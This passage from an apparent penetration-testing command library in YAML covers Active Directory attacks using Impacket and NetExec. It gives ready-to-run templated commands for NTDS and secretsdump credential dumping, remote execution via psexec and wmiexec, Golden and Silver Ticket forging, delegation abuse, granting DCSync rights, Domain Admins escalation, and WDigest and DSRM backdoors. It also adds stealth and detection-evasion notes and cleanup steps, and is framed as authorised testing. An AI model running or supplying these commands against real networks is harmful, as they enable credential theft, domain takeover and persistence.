        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --ntds vss"
      - label: NTDS with specific user
        cmd: "nxc smb {DC_IP} -u {USERNAME} -p '{PASSWORD}' --ntds --userntds {TARGET_USER}"
    next:
      - Extract KRBTGT hash for Golden Ticket
      - Crack domain hashes offline
      - Document all domain credentials for report
    opsec: Creates VSS shadow copy — logged in event log. More stealthy than DCSync for some detections.
    cleanup:
      - label: Remove shadow copies
        cmd: "vssadmin delete shadows /all /quiet"

  # ══════════════════════════════════════════════════════════════════
  # IMPACKET TOOLKIT — LATERAL MOVEMENT
  # ══════════════════════════════════════════════════════════════════

  - id: impacket_exec_suite
    tab: Lateral Movement
    name: Impacket — Exec Suite (psexec/smbexec/wmiexec/dcomexec/atexec)
    desc: Full Impacket remote execution suite. Each method has different stealth characteristics and requirements.
    requires_priv: local_admin
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [impacket, lateral, exec, psexec, wmiexec, smbexec]
    commands:
      - label: PSExec (loudest — creates service)
        cmd: "impacket-psexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: PSExec with hash
        cmd: "impacket-psexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
      - label: SMBExec (no binary drop, uses CMD)
        cmd: "impacket-smbexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: WMIExec (quiet — no service)
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: WMIExec with hash
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}@{TARGET_IP} -hashes :{NTLM_HASH}"
      - label: WMIExec Kerberos
        cmd: "impacket-wmiexec -k -no-pass {DOMAIN}/{USERNAME}@{TARGET_IP}"
      - label: DCOMExec (via DCOM)
        cmd: "impacket-dcomexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: ATExec (via Task Scheduler)
        cmd: "impacket-atexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} whoami"
    next:
      - Dump credentials from the established shell
      - Enumerate domain from machine context
      - Check for local admin password reuse
    opsec: "PSExec=loudest (event 7045), SMBExec=moderate, WMIExec=quiet, DCOM=quiet. Prefer WMIExec."
    cleanup:
      - label: Remove PSEXESVC
        cmd: "sc \\\\{TARGET_IP} delete PSEXESVC"

  - id: impacket_rdp_check
    tab: Lateral Movement
    name: Impacket — RDP Check & Enable
    desc: Check RDP access and enable RDP on remote hosts using impacket and reg commands.
    requires_priv: local_admin
    requires: [TARGET_IP, USERNAME, PASSWORD, DOMAIN]
    tags: [impacket, rdp, lateral, enable]
    commands:
      - label: Check RDP with NXC
        cmd: "nxc rdp {TARGET_IP} -u {USERNAME} -p '{PASSWORD}'"
      - label: Enable RDP via registry
        cmd: "impacket-reg {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server' -v fDenyTSConnections -vt REG_DWORD -vd 0"
      - label: Add firewall rule
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} -c 'netsh advfirewall firewall add rule name=RDP dir=in protocol=TCP localport=3389 action=allow'"
      - label: RDP with hash (xfreerdp)
        cmd: "xfreerdp /v:{TARGET_IP} /u:{USERNAME} /pth:{NTLM_HASH} /cert-ignore"
    next:
      - GUI access — dump credentials via Task Manager > Details > right-click > Create dump file
      - Enable clipboard for data transfer
    opsec: Enabling RDP generates event 4657 (registry change). Logs 4624 type 10 on connections.
    cleanup:
      - label: Disable RDP
        cmd: "impacket-reg {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server' -v fDenyTSConnections -vt REG_DWORD -vd 1"

  - id: impacket_ticket_ops
    tab: Lateral Movement
    name: Impacket — Ticket Operations (getTGT/getST/ticketer)
    desc: Kerberos ticket operations — request TGTs, service tickets, forge Golden/Silver tickets.
    requires_priv: null
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [impacket, kerberos, tgt, ticket, golden, silver]
    commands:
      - label: Get TGT
        cmd: "impacket-getTGT {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: Get TGT with NTLM hash
        cmd: "impacket-getTGT {DOMAIN}/{USERNAME} -hashes :{NTLM_HASH} -dc-ip {DC_IP}"
      - label: Get Service Ticket (S4U impersonation)
        cmd: "impacket-getST -spn cifs/{TARGET_COMPUTER}.{DOMAIN} -impersonate {TARGET_USER} {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: Golden Ticket
        cmd: "impacket-ticketer -nthash {KRBTGT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} administrator"
      - label: Silver Ticket
        cmd: "impacket-ticketer -nthash {SERVICE_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn {TARGET_SPN} administrator"
      - label: Use ticket
        cmd: "export KRB5CCNAME=$(pwd)/administrator.ccache"
      - label: Verify ticket
        cmd: "klist"
    next:
      - Use Golden Ticket for full domain access without touching KDC
      - Silver Ticket is stealthier — no KDC contact for service access
      - S4U impersonation for constrained delegation abuse
    opsec: Golden ticket creation requires KRBTGT hash (from DCSync). Silver ticket never contacts KDC — very stealthy.
    cleanup:
      - label: Remove ticket files
        cmd: "rm -f *.ccache *.ccach"

  # ══════════════════════════════════════════════════════════════════
  # IMPACKET TOOLKIT — PRIVILEGE ESCALATION
  # ══════════════════════════════════════════════════════════════════

  - id: impacket_delegation_abuse
    tab: Privilege Escalation
    name: Impacket — Delegation Abuse Suite
    desc: Full delegation abuse toolkit — findDelegation, S4U2Proxy, RBCD setup.
    requires_priv: null
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [impacket, delegation, kerberos, rbcd, s4u, privesc]
    commands:
      - label: Find all delegation accounts
        cmd: "impacket-findDelegation {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: S4U2Proxy — impersonate admin to SPN
        cmd: "impacket-getST -spn 'cifs/{TARGET_COMPUTER}.{DOMAIN}' -impersonate administrator {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: Add fake computer for RBCD
        cmd: "impacket-addcomputer {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -computer-name FAKEBOX$ -computer-pass 'FakePass123!'"
      - label: Verify new computer account
        cmd: "nxc ldap {DC_IP} -u {USERNAME} -p '{PASSWORD}' --query '(sAMAccountName=FAKEBOX$)' 'sAMAccountName'"
    next:
      - After RBCD — run getST to impersonate admin and get cifs ticket
      - Use ticket with smbexec/wmiexec for code execution
      - Clean up fake computer account after testing
    opsec: Computer account creation logged (event 4741). RBCD modification logged (event 5136).
    cleanup:
      - label: Remove fake computer account
        cmd: "impacket-addcomputer {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP} -computer-name FAKEBOX$ -delete"

  - id: impacket_changepasswd
    tab: Privilege Escalation
    name: Impacket — Password & ACL Abuse
    desc: Force password changes, modify ACLs, and abuse AD object permissions using Impacket and dacledit.
    requires_priv: null
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, TARGET_USER]
    tags: [impacket, acl, dacl, password-change, privesc]
    commands:
      - label: Force password change (GenericAll/GenericWrite on user)
        cmd: "impacket-changepasswd {DOMAIN}/{TARGET_USER} -newhash :aad3b435b51404eeaad3b435b51404ee -no-pass -altuser {DOMAIN}/{USERNAME} -altpass '{PASSWORD}' -dc-ip {DC_IP}"
      - label: Grant DCSync rights (WriteDACL on domain)
        cmd: "impacket-dacledit -action write -rights DCSync -principal {USERNAME} -target-dn 'DC=corp,DC=local' {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: Revert DCSync rights
        cmd: "impacket-dacledit -action remove -rights DCSync -principal {USERNAME} -target-dn 'DC=corp,DC=local' {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"
      - label: Add to Domain Admins (GenericAll on group)
        cmd: "net rpc group addmem 'Domain Admins' {USERNAME} -U '{DOMAIN}/{USERNAME}%{PASSWORD}' -S {DC_IP}"
      - label: Remove from Domain Admins (cleanup)
        cmd: "net rpc group delmem 'Domain Admins' {USERNAME} -U '{DOMAIN}/{USERNAME}%{PASSWORD}' -S {DC_IP}"
    next:
      - After DCSync rights granted — immediately run DCSync for all hashes
      - Revert ACL changes immediately after exploitation
      - Document all changes for cleanup report
    opsec: ACL changes logged (event 4662 with GUID). BloodHound detects modifications. Revert immediately.
    cleanup:
      - label: Revert DCSync ACL
        cmd: "impacket-dacledit -action remove -rights DCSync -principal {USERNAME} -target-dn 'DC=corp,DC=local' {DOMAIN}/{USERNAME}:'{PASSWORD}' -dc-ip {DC_IP}"

  # ══════════════════════════════════════════════════════════════════
  # IMPACKET TOOLKIT — DOMAIN DOMINANCE
  # ══════════════════════════════════════════════════════════════════

  - id: impacket_secretsdump_full
    tab: Domain Dominance
    name: Impacket — secretsdump Full Suite
    desc: Complete credential extraction — DCSync all users, specific users, NTDS via VSS, remote SAM/LSA, local offline extraction.
    requires_priv: da
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD]
    tags: [impacket, secretsdump, dcsync, ntds, da, all-hashes]
    commands:
      - label: DCSync — all users
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc"
      - label: DCSync — NTLM only (less output noise)
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc -just-dc-ntlm"
      - label: DCSync — single user
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc-user {TARGET_USER}"
      - label: DCSync — krbtgt specifically
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc-user krbtgt"
      - label: DCSync with hash
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}@{DC_IP} -hashes :{NTLM_HASH} -just-dc"
      - label: Remote SAM dump (non-DC)
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} -sam"
      - label: Remote LSA dump
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} -lsa"
      - label: NTDS via VSS (avoids DRSUAPI detection)
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -use-vss"
      - label: Local offline extraction
        cmd: "impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL"
      - label: Output to file
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} -just-dc -outputfile /tmp/domain_hashes"
    next:
      - Extract and crack krbtgt for Golden Ticket
      - Pass-the-hash with DA accounts
      - Document all hashes for final report
      - Check for service account password reuse
    opsec: DCSync generates event 4662 with replication GUIDs. Detected by Microsoft Defender Identity and ATA.
    cleanup: []

  - id: impacket_reg_wmi
    tab: Domain Dominance
    name: Impacket — Registry & WMI Operations
    desc: Remote registry operations and WMI persistence/execution via Impacket.
    requires_priv: da
    requires: [DC_IP, DOMAIN, USERNAME, PASSWORD, TARGET_IP]
    tags: [impacket, registry, wmi, persistence, da]
    commands:
      - label: Registry query (remote)
        cmd: "impacket-reg {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} query -keyName 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion'"
      - label: Registry — enable WDigest
        cmd: "impacket-reg {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -v UseLogonCredential -vt REG_DWORD -vd 1"
      - label: Registry — DSRM backdoor enable
        cmd: "impacket-reg {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v DSRMAdminLogonBehavior -vt REG_DWORD -vd 2"
      - label: WMI execute command
        cmd: "impacket-wmiexec {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} 'cmd /c whoami'"
      - label: WMI query
        cmd: "impacket-wmiquery {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} 'SELECT * FROM Win32_Process'"
      - label: Remote SCCM/ConfigMgr query
        cmd: "impacket-wmiquery {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} 'SELECT * FROM SMS_R_System'"
    next:
      - WDigest enabled — next logon will cache cleartext password in LSASS
      - DSRM backdoor persists across reboots — document for client
      - Revert all registry changes before leaving
    opsec: Registry changes logged (event 4657). WDigest is a well-known persistence technique — triggers Defender on modern systems.
    cleanup:
      - label: Disable WDigest
        cmd: "impacket-reg {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP} add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -v UseLogonCredential -vt REG_DWORD -vd 0"
      - label: Remove DSRM registry key
        cmd: "impacket-reg {DOMAIN}/{USERNAME}:'{PASSWORD}'@{DC_IP} delete -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa' -v DSRMAdminLogonBehavior"

